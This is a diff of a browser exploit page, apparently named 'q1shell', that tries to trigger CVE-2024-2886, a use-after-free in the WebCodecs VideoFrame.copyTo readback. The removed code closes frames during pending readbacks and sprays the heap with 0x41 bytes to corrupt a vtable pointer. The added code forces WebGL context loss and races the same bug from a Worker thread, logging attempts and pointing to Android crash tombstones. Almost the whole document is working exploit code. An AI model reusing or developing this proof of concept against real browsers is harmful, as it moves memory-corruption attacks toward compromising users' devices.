@@ -1,83 +1,86 @@
 <!doctype html>
 <html>
-<head><title>q1shell - crash</title></head>
+<head><title>q1shell - crash2</title></head>
 <body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
 <div id="out"></div>
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
 async function crash() {
-    log('CVE-2024-2886 — intentional crash for tombstone analysis');
+    log('CVE-2024-2886 — context loss approach');
     log('');
 
-    const canvas = new OffscreenCanvas(64, 64);
-    const gl = canvas.getContext('webgl');
-
-    // Aggressively trigger UAF to force a real crash
-    // Instead of await-ing the promise, fire many simultaneously
-    // and try to corrupt the vtable call
-
     let attempt = 0;
-    let crashed = false;
 
-    while (!crashed) {
+    while (true) {
         attempt++;
-        
-        // Create many frames simultaneously
-        const frames = [];
-        const promises = [];
-        const bufs = [];
 
-        for (let i = 0; i < 50; i++) {
-            gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
-            gl.clear(gl.COLOR_BUFFER_BIT);
-            gl.finish();
-            
-            const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 + i });
-            const buf = new Uint8Array(frame.allocationSize());
-            bufs.push(buf);
-            
-            // Start async readback
-            const p = frame.copyTo(buf);
-            promises.push(p);
-            frames.push(frame);
-        }
+        // Fresh canvas + context each round
+        const canvas = new OffscreenCanvas(64, 64);
+        const gl = canvas.getContext('webgl');
+        const loseCtx = gl.getExtension('WEBGL_lose_context');
 
-        // Free ALL frames immediately while ALL readbacks are pending
-        for (const f of frames) {
-            f.close();
-        }
+        gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gl.finish();
 
-        // Now aggressively allocate to try to reclaim freed memory
-        // with garbage that will corrupt the vtable pointer
-        const trash = [];
-        for (let i = 0; i < 2000; i++) {
-            // Allocate various sizes to hit the right bucket
-            trash.push(new Uint8Array(32).fill(0x41));
-            trash.push(new Uint8Array(64).fill(0x41));
-            trash.push(new Uint8Array(128).fill(0x41));
+        // Create frame from GPU-backed canvas
+        const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 });
+        const buf = new Uint8Array(frame.allocationSize());
+
+        // Start async GPU readback
+        const promise = frame.copyTo(buf);
+
+        // Close the frame
+        frame.close();
+
+        // Also lose the WebGL context to force GPU resource invalidation
+        // This might cause the pending readback to access freed GPU memory
+        if (loseCtx) {
+            loseCtx.loseContext();
         }
 
         try {
-            await Promise.all(promises);
-            trash.length = 0;
-            
-            if (attempt % 10 === 0) {
-                log('attempt ' + attempt + ' — still no crash, continuing...');
+            await promise;
+            if (attempt % 20 === 0) {
+                log('attempt ' + attempt + ' — no crash yet');
             }
         } catch(e) {
-            log('ERROR on attempt ' + attempt + ': ' + e.message);
-            // If we see an error here the vtable might be corrupted
-            crashed = true;
+            log('THREW on attempt ' + attempt + ': ' + e.message);
+            // Error during readback = we may have hit something
         }
 
-        if (attempt > 200) {
-            log('200 attempts done — crash may need more aggressive approach');
-            log('Check logcat for tombstone anyway');
+        if (attempt > 300) {
+            log('300 done - check logcat for any tombstone');
             break;
         }
     }
 }
+
+// Also try hammering from a Worker for true threading
+const workerCode = `
+self.onmessage = async () => {
+    const canvas = new OffscreenCanvas(64, 64);
+    const gl = canvas.getContext('webgl');
+    
+    for (let i = 0; i < 1000; i++) {
+        gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        const frame = new VideoFrame(canvas, { timestamp: i * 1000 });
+        const buf = new Uint8Array(frame.allocationSize());
+        const p = frame.copyTo(buf);
+        frame.close();
+        try { await p; } catch(e) {}
+    }
+    postMessage('done');
+};
+`;
+
+const blob = new Blob([workerCode], { type: 'application/javascript' });
+const worker = new Worker(URL.createObjectURL(blob));
+worker.onmessage = e => log('Worker: ' + e.data);
+worker.onerror = e => log('Worker CRASH: ' + e.message);
+worker.postMessage('go');
 
 crash();
 </script>
